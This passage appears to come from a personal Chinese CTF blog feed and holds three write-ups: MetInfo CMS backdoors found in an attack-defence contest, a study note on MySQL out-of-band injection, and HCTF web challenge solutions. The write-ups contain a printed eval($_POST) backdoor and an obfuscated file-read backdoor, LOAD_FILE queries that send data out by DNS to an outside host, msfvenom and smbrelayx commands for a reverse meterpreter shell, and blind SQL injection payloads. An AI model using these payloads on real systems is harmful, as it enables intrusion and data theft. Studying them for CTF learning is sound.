<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment"># MetInfo Enterprise Content Management System </span></span><br><span class="line"><span class="comment"># Copyright (C) MetInfo Co.,Ltd (http:</span></span><br><span class="line">$b=@$_GET[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'Y2hlYw=='</span>)];</span><br><span class="line"><span class="keyword">if</span> ($b!=<span class="string">""</span>) </span><br><span class="line">&#123;</span><br><span class="line">	$a = $GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJSUkx'</span>)](md5($b),<span class="number">0</span>,<span class="number">9</span>);</span><br><span class="line">	$c = $GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJSUkx'</span>)](md5($a),<span class="number">5</span>,<span class="number">18</span>);</span><br><span class="line">	$c = md5($c);</span><br><span class="line">	echo $c;</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line">$d = @$_GET[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'img_tet'</span>)];</span><br><span class="line">$d = $GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJSWwx'</span>)]($d);</span><br><span class="line">$d = str_replace( $GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'flag'</span>),<span class="string">""</span>,$d);</span><br><span class="line"><span class="keyword">if</span> ($d!=<span class="string">""</span>) </span><br><span class="line">&#123;</span><br><span class="line">	$GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJSTFJ'</span>)]($GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'Content-Type: imgage/jpeg'</span>));</span><br><span class="line">	$GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJSTFJ'</span>)]($GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'Content-Disposition: attachment; filename='</span>).$d);</span><br><span class="line">	$GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJSTFJ'</span>)]($GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'Content-Lengh: '</span>).$GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJSTFs'</span>)]($d));</span><br><span class="line">	$e = $GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJbElJ'</span>)]($d,<span class="string">"r"</span>) <span class="keyword">or</span> die(<span class="string">"Unable to open file!"</span>);</span><br><span class="line">	$f = $GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJbEkx'</span>)]($e,$GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJSTFs'</span>)]($d));</span><br><span class="line">	$GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJbGxJ'</span>)]($e);</span><br><span class="line">	echo $f;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">echo $GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'Cg=='</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>也就是Get一个参数img_tet,检测传参内容是否有flag，有的话就替换为空格所以直接利用：cat /flflagag就可以绕过检测，这也是全场一次在打的一个洞。下面也贴出其他师傅解混淆的方法，建一个php文件</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'picture.inc.php'</span>);</span><br><span class="line">var_dump(get_defined_vars());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>调用函数var_dump(get_defined_vars())进行反混淆，本地运行可以得到一样的源码。<img src="/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/8418106-15bd7af93d209fda.png" alt><br>这里直接贴出BXS师傅完全修复的源码：<img src="/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/8418106-8fdc8f0abaf18052.jpg" alt></p>
<h2 id="0x03-重置数据库"><a href="#0x03-重置数据库" class="headerlink" title="0x03 重置数据库"></a>0x03 重置数据库</h2><p>利用安装框架的配置文件，重置数据库这个也是迷，不过利用起来也是没有难度的，主要就看能不能找到这个页面了，估计是主办方故意留下这个页面的，利用方法，直接访问 \include\frame 目录下 index.php，直接就进入了配置页面<br><img src="/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/8418106-a677562380059b89.png" alt></p>
<p>跟着走一遍，重置一下网站，然后跳第一步Getshell就好。</p>
<h2 id="0x04-主办方设置的后门利用"><a href="#0x04-主办方设置的后门利用" class="headerlink" title="0x04 主办方设置的后门利用"></a>0x04 主办方设置的后门利用</h2><p>对于这个后门，调试也是到了比赛结束后，about/show.php 30、31行</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">$show_tiny=create_function(<span class="string">""</span>, base64_decode(<span class="string">'QGV2YWwoJF9QT1NUWyJpY3FjdGZlciJdKTs='</span>));</span><br><span class="line">$show_tiny();</span><br></pre></td></tr></table></figure>
<p>解base64后得到的是一个自带后门：@eval($_POST[“icqctfer”]);<br>当时在现场的时候看到这个就直接在show.php后用POST传参icqctfer=<strong>****</strong>，没有得到任何想要的结果，当时还以为大家都补了，没有注意到源码中还有限制条件，主要是在show.php中的<br> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(!$id &amp;&amp; $class1)$id &#x3D; $class1;</span><br><span class="line">if(!is_numeric($id))okinfo(&#39;..&#x2F;404.html&#39;);</span><br><span class="line">$show &#x3D; $db-&gt;get_one(&quot;SELECT * FROM $met_column WHERE id&#x3D;&#39;$id&#39; and module&#x3D;1&quot;);</span><br><span class="line">if(!$show||!$show[&#39;isshow&#39;])&#123;</span><br><span class="line">okinfo(&#39;..&#x2F;404.html&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>is_numeric()函数要求变量id要是数字，这个地方比较好过，由于对$id没有做任何限制的，我们可以在本地调试测试，把变量id覆盖就好了，不过后面的查询语句也要求了id值得赋成1，payload:<a href="http://127.0.0.1/CTF/shanghai/default/about/show.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/CTF/shanghai/default/about/show.php?id=1</a><br>之后主要是$show变量的问题， $db-&gt;get_one(“SELECT * FROM $met_column WHERE id=’$id’ and module=1”)将表met_column的第一行信息以数组的方式赋值给变量show，本地查看数据库<br><img src="/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/8418106-640ee3a29ec2e4db.png" alt><br>其中isshow列默认值为 0<br><img src="/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/8418106-796a9719aa2b0afb.png" alt><br>而要过条件if(!$show||!$show[‘isshow’])只有当$show = 1或者$show[‘isshow’] = 1，而从数据库中看来使得$show = 1是不可能的，我们没法把对方的数据库id = 1的所有信息都置1，所以只有将$show[‘isshow’]置 1 。而要将变量$show[‘isshow’]置 1，需要进入Metinfo后台：设置-&gt;栏目 中修改about的参数，将 添加内容 段改成允许，就可以将isshow置为1,从而通过条件，就可以利用icqctfer了。<br><img src="/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/8418106-3166828be770c331.png" alt><br>那么问题来了，要想进后台修改配置利用这个后门，除非一上手在别人没改密码之前进入别人后台修改，等大家都把后台密码改了，也就只有通过重置数据库的方法进入后台，既然后重置数据库进入后台了，还不如上传木马来打，所以这个后门看似简单，其实用起来太麻烦，价值也不高。</p>
<h2 id="0x05-结语"><a href="#0x05-结语" class="headerlink" title="0x05 结语"></a>0x05 结语</h2><p>本菜因才疏学浅，只挖到了部分的洞，因为上次在场上的时候有师傅直接把网站页面给改写了，说明还有其他的利用点，这里膜一下，本文章只用来学习记录。</p>
]]></content>
      <categories>
        <category>Cyc1e的CTF之路</category>
      </categories>
      <tags>
        <tag>AWD</tag>
        <tag>cms</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>一道题目引发的MySQL-Out-of-Band学习笔记</title>
    <url>/2017/11/20/%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E5%BC%95%E5%8F%91%E7%9A%84MySQL-Out-of-Band%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>研究这个攻击方式主要是因为在近期的HCTF上遇到了这个漏洞点，之前一直没有什么时间来了解mysql，所以遇到的时候有点懵，不过题目考点只是OOB的一部分，所以花点时间把oob了解的深刻一点。</p>
<p>##0x01 什么是 Out-of-Band 注入<br> 讲得通俗一点就是通过其他方式来提取mysql数据，也就是带外攻击，比如可以通过DNS解析，HHTP，文件系统等</p>
<h2 id="0x02-MySQL的限制"><a href="#0x02-MySQL的限制" class="headerlink" title="0x02 MySQL的限制"></a>0x02 MySQL的限制</h2><p>oob攻击主要是针对MySQL 5.5.53以及之前的版本，在MySQL中存在一个全局变量：secure_file_priv,主要是用来限制数据写入和写出的，在5.5.53版本之前，变量的默认value是空，例如本次我测试的环境：<img src="/2017/11/20/%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E5%BC%95%E5%8F%91%E7%9A%84MySQL-Out-of-Band%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/8418106-722d423dcb8ab1f3.png" alt></p>
<p>而5.5.53版本后secure_file_priv变量默认值为NULL，即我们不可以利用该变量进行数据写入写出操作，但有时有需要用到写入写出功能的时候，可以将secure_file_priv变量设置为空，例如，在my.ini中直接插入一条：secure_file_priv=     即可。</p>
<h2 id="0x03-利用INTO-OUTFILE等语句写出数据"><a href="#0x03-利用INTO-OUTFILE等语句写出数据" class="headerlink" title="0x03 利用INTO OUTFILE等语句写出数据"></a>0x03 利用INTO OUTFILE等语句写出数据</h2><p>利用INTO OUTFILE等语句可以将查询信息写出到文件中<br>windows下测试：</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">select @@version into outfile <span class="string">'H:\\test.txt'</span>;</span><br><span class="line">select @@version into dumpfile <span class="string">'H:\\test.txt'</span>;</span><br></pre></td></tr></table></figure>
<p><img src="/2017/11/20/%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E5%BC%95%E5%8F%91%E7%9A%84MySQL-Out-of-Band%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/8418106-a07ddf60fed054ea.png" alt></p>
<h2 id="0x04-DNS解析获取数据"><a href="#0x04-DNS解析获取数据" class="headerlink" title="0x04 DNS解析获取数据"></a>0x04 DNS解析获取数据</h2><p>我们使用load_file()语句将数据信息导出到外部服务器上，例如DNS解析器，但mysql尝试解析DNF时，我们就可以在DNS解析式上获取到查询数据信息，这里贴一个DNS解析的API：<a href="http://ceye.io/records/dns" target="_blank" rel="noopener">http://ceye.io/records/dns</a><br>查询语句例如：</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">SELECT LOAD_FILE(CONCAT(<span class="string">'\\\\'</span>,version(),<span class="string">'.mysql.ip.port.8cs2vs.ceye.io\\abc'</span>));</span><br></pre></td></tr></table></figure>
<p>我们可以在DNS接口处看到成功获取到查询数据<br><img src="/2017/11/20/%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E5%BC%95%E5%8F%91%E7%9A%84MySQL-Out-of-Band%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/8418106-49b29c165bd155a2.png" alt></p>
<h2 id="0x05-SMB中继攻击"><a href="#0x05-SMB中继攻击" class="headerlink" title="0x05 SMB中继攻击"></a>0x05 SMB中继攻击</h2><p>这个攻击方式主要是利用mysql服务器通过load_file、into outfile/dumpfile、load data infile等函数向主机连接通信的时候（描述不一定准确），使用smbrelayx等工具将反向shell上传到主机中。smbrelayx工具下载地址：<a href="https://github.com/coresecurity/impacket" target="_blank" rel="noopener">https://github.com/coresecurity/impacket</a><br>利用kaili生成反向连接shell（win7环境）：</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="number">172.20</span>.<span class="number">10.5</span> LPORT=<span class="number">443</span>  -f exe &gt; win64.exe</span><br></pre></td></tr></table></figure>
<p>启用smbrelayx.py</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">smbrelayx.py -h [攻击主机ip] -e ./win64.exe</span><br></pre></td></tr></table></figure>
<p>Metasploit上启用multi/handler模块，设置好payload，lhost，lport，在MySQL服务器上执行：</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">select load_file(<span class="string">'\\\\172.20.10.5\\test'</span>);</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<p>即可发起smb中继攻击，从而反向Getshell，由于MySQL版本的原因，此攻击利用率较低，不过也不乏有少数管理员将secure_file_priv变量开启利用，或者MySQL没有及时更新升级。</p>
<h2 id="0x06-参考文章"><a href="#0x06-参考文章" class="headerlink" title="0x06 参考文章"></a>0x06 参考文章</h2><p><a href="https://osandamalith.com/2017/02/03/mysql-out-of-band-hacking/" target="_blank" rel="noopener">Osanda Malith Jayathissa</a></p>
<p><strong>文章只用于个人学习记录</strong></p>
]]></content>
      <categories>
        <category>Cyc1e的CTF之路</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>Out-of-Band</tag>
      </tags>
  </entry>
  <entry>
    <title>两天做了HCTF的最简单的题</title>
    <url>/2017/11/12/%E4%B8%A4%E5%A4%A9%E5%81%9A%E4%BA%86HCTF%E7%9A%84%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E9%A2%98/</url>
    <content><![CDATA[<h3 id="0x00-poker2"><a href="#0x00-poker2" class="headerlink" title="0x00 poker2"></a>0x00 poker2</h3><p>这两天真的是沉迷游戏，不能自拔，刚开始进入游戏的时候，发现同目录有flag.php，要求游戏升到100级，就可以得到flag，那就是刷级了，结果一注册，发现送了成长礼包（后来才发现原来其他人没有），直接飙到90级，占据全服第一的位置一个上午。这题就是抓包重复刷怪就好了，只知道圣诞小屋经验高。这里直接贴脚本了</p>
<p><img src="/2017/11/12/%E4%B8%A4%E5%A4%A9%E5%81%9A%E4%BA%86HCTF%E7%9A%84%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E9%A2%98/8418106-2249f408b45e1c33.png" alt></p>
<p>简单的刷分脚本                                        </p>
<p>到了100级后到flag.php就直接得到flag：hctf{Go0dLuck_toGetTheFl3g__from_game}</p>
<p><strong>boring website</strong></p>
<p>扫描发现有<a href="http://www.zip，里面有index.php的源码" target="_blank" rel="noopener">www.zip，里面有index.php的源码</a></p>
<p><img src="/2017/11/12/%E4%B8%A4%E5%A4%A9%E5%81%9A%E4%BA%86HCTF%E7%9A%84%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E9%A2%98/8418106-3cf59e70e00511d7.png" alt>                                   </p>
<p>注入点很明显，就是在参数id那，数据库密码 ‘oob’ 提示这道题是MySQL Out-of-Band攻击，再加上注释的 //link server: On  linkname:mysql，目标数据库是SQL Server的，所以这里要用到OpenQuery表达式：OPENQUERY (  linked_server ,’query’ )，由于过滤了敏感字符，没法得到回显，主要参考文章：</p>
<p><a href="http://bobao.360.cn/learning/detail/3458.html，发现可以利用DNS解析提取数据，例如：select" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/3458.html，发现可以利用DNS解析提取数据，例如：select</a>  load_file(concat(‘\’,version(),’.hacker.site\a.txt’));所以构造payload：id=1; select * from OpenQuery(mysql,’SELECT LOAD_FILE(CONCAT(“\”,(select  1),”.mysql.ip.port.8cs2vs.ceye.io\abc”))’);</p>
<p>在DNS解析平台可以得到反馈数据，那么就下来就是把(select 1)改成查库，查表，查字段/内容的语句就好了,主要还是学习了oob攻击一波，这里直接贴图：</p>
<p><img src="/2017/11/12/%E4%B8%A4%E5%A4%A9%E5%81%9A%E4%BA%86HCTF%E7%9A%84%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E9%A2%98/8418106-e8fd0904e57cdc6f.png" alt></p>
<p>得到flag：hctf{dn5-1og-can-take-f14g-6as84f}</p>
<h3 id="0x01-poker-poker"><a href="#0x01-poker-poker" class="headerlink" title="0x01 poker-poker"></a>0x01 poker-poker</h3><p>打开发现和level 2里的poker2是一样的，那就是一道题两个flag，在做level 2  的时候，就尝试过很多方法，抓包的时候发现带有很多参数，所以把包后甩sqlmap里跑了一下，在注册处的包有报存在注入，但是sqlmap都没法跑出来，带着测试一波的心理开始手动测试，发现username参数可以进行时间盲注，没有过滤，直接构造payload：</p>
<p>?bc=2&amp;bname=easdasd&amp;head=6&amp;pass=&amp;sex=2&amp;username= ’ and if( (ascii(substr((select database()),1))&gt;97),sleep(5)1)–+</p>
<p>发现不仅可以时间，还可以直接判断返回值来注，可以构造payload：</p>
<p>?bc=2&amp;bname=easdasd&amp;head=6&amp;pass=&amp;sex=2&amp;username=11111 ’ and if( (ascii(substr((select database()),1))&gt;97),0,1)–+  进行注入（这样写脚本方便点）</p>
<p>这里必须补充写下，直接查库是pm_hctf，查到第一个表是PasswordProtection</p>
<p>看到题目是的pspt，心里有点小高兴，结果花了好几个小时，把pm_hctf库下100多个表名都看了一遍，发现没有和flag有关的啊，最后重新查了下其他库，有个hctf，flag2表，真的是一把幸酸泪啊，直接贴脚本：</p>
<p><img src="/2017/11/12/%E4%B8%A4%E5%A4%A9%E5%81%9A%E4%BA%86HCTF%E7%9A%84%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E9%A2%98/8418106-dcb4fcdd43d1eead.png" alt>                                      </p>
<p><img src="https://upload-images.jianshu.io/upload_images/8418106-401387e4b93a4c11.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>得到flag：hctf{y3u_G0t_tHe__poker_game}</p>
]]></content>
      <categories>
        <category>Cyc1e的CTF之路</category>
      </categories>
      <tags>
        <tag>逻辑</tag>
      </tags>
  </entry>
</search>
